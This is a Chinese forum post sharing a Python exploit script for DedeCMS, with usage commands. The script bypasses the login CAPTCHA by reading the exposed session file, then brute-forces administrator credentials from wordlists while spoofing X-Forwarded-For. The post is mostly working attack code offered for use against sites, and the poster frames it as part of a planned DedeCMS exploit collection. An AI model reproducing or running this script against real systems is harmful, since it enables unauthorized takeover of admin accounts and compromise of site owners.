漏洞地址原文：http://www.wooyun.org/bugs/wooyun-2014-075051，漏洞原理我就不说了。。。。，大家可以自己去看，顺便感谢挖洞的这个牛

其实打算做一个dede漏洞工具利用集合(2014-2016)，囊括dede比较新的漏洞，论坛搜索了看看，Dedecms 20150618 注入一枚(过防注入\可注入管理员账户)论坛好像没有利用工具，前天就写好了，结果发现百度已经有份放出了。我承认我火星了 好吧 
于是我就继续写了dedecms全版本验证码绕过爆破exp，百度和论坛应该都没有，算是我们大90首发吧（可以无视。。。）。虽然不是最新的洞，也没最新的洞好用（主要是最新的注入洞太吊了），但是强迫症让我还是写了，已知缺点就是速度有点慢，主要想和后面的exp一起加上多线程，如果各位表哥有什么好的建议可以告诉我，我会听取的，有不足的地方也请指出来

使用方法：
指定账户，导入密码词典：  xx.py --host=http://127.0.0.1/dede5_7 --user=admin --filepwd=C:\Users\Administrator\Desktop\111.txt
指定密码，导入账户词典：  xx.py --host=http://127.0.0.1/dede5_7 --password=admin --fileusr=C:\Users\Administrator\Desktop\111.txt
指定导入账户词典，导入密码词典：  xx.py --host=http://127.0.0.1/dede5_7 --filepwd=C:\Users\Administrator\Desktop\111.txt --fileusr=C:\Users\Administrator\Desktop\111.txt
最好不要有中文路径

#coding=utf-8
import urllib2
import  urllib
import cookielib
import sys
import argparse
 
def lines(f):
 
        while 1:
            line=f.readline()
            if not line:
                break
            yield line
 
class attack:
 
    def __init__(self,host=None,user=None,password=None,fileusr=None,filepwd=None):
 
        self.user=user
        self.host=host
        self.password=password
        self.fileusr=fileusr
        self.filepwd=filepwd
        self.cj=cookielib.CookieJar()
        self.opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cj))
        self.opener.addheaders.append(('User-Agent','Mozilla/5.0'))
        self.opener.addheaders.append(('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'))
        self.opener.addheaders.append(('Accept-Language','zh-cn,zh;q=0.5'))
        self.opener.addheaders.append(('Accept-Encoding','gzip,deflate'))
        self.opener.addheaders.append(('Accept-Charset','GB2312,utf-8;q=0.7,*;q=0.7'))
        self.opener.addheaders.append(('Keep-Alive','115'))
        self.opener.addheaders.append(('Connection','keep-alive'))
        self.opener.addheaders.append(('X-Forwarded-For','219.78.113.243'))
 
 
    def brute(self,user=None,passwd=None):
 
        url=self.host+'/dede/login.php'
        index=self.opener.open(url).read()
        url=self.host+'/include/vdimgck.php'
        index_2=self.opener.open(url)
        for cookie in self.cj:
            if cookie.name=='PHPSESSID':
                name=cookie.value
                break
        url=self.host+'/data/sessions/'+'sess_'+name
        tmp=self.opener.open(url).read()
        tmp=tmp.split('"')
        validate=tmp[1]
        values={'userid':user,
                'pwd':passwd,
                'validate':validate,
                'dopost':'login',
                'adminstyle':'newdedecms',
                'gotopage':'',
                'sm1':''
                }
        data=urllib.urlencode(values)
        url=self.host+'/dede/login.php'
        index=self.opener.open(url,data).read()
        index=index.decode('utf-8').encode('gbk')
        key= '成功登录'.decode('utf-8').encode('gbk')
        if key in index:
            return True
        else:
            return False
 
 
 
    def run(self):
        try :
            print 'It is crackeding......please wait'
            if self.user and self.filepwd:
                f=open(self.filepwd)
                for line in lines(f):
                    if self.brute(user=self.user,passwd=line):
                        self.display(line,'password')
                        exit()
                    else:
                        pass
            elif self.password and self.fileusr:
                f=open(self.fileusr)
                for line in lines(f):
                    if self.brute(user=line,passwd=self.password):
                        self.display(line,'username')
                        exit()
                    else:
                        pass
            elif self.fileusr and self.filepwd:
                 fu=open(self.fileusr)
                 fp=open(self.filepwd)
                 for user in lines(fu):
                     for pwd in lines(fp):
                         if self.brute(user=user,passwd=pwd):
                            self.display(user,'username')
                            self.display(pwd,'password')
                            exit()
                         else:
                             pass
                     fp.close()
                     fp=open(self.filepwd)
        except KeyboardInterrupt:
            print 'Stop crack!!!'
            exit()
 
 
    def display(self,result,name):
 
        print '%s is cracked'.decode('utf-8').encode('gbk') % name.capitalize()
        print '%s is: %s '.decode('utf-8').encode('gbk')% (name.capitalize(),result)
 
 
 
if __name__=='__main__':
 
    parser = argparse.ArgumentParser(description = 'dedecms 2014-09-05 Brute force')
    parser.add_argument('--host', action = 'store', dest = 'host')
    parser.add_argument('--user', action = 'store', dest = 'user')
    parser.add_argument('--password', action = 'store', dest = 'password')
    parser.add_argument('--fileusr', action = 'store', dest = 'fileusr')
    parser.add_argument('--filepwd', action = 'store', dest = 'filepwd')
    given_args = parser.parse_args()
    host = given_args.host
    user = given_args.user
    password = given_args.password
    fileusr = given_args.fileusr
    filepwd = given_args.filepwd
 
 
    if host==None:
        print 'Please specify the target host!'
        exit()
    elif user and filepwd:
        arms=attack(host=host,user=user,file_pwd=filepwd)
        arms.run()
    elif password and fileusr:
        arms=attack(host=host,password=password,fileusr=fileusr)
        arms.run()
    elif filepwd and fileusr:
        arms=attack(host=host,fileusr=fileusr,filepwd=filepwd)
        arms.run()
    else:
        pass
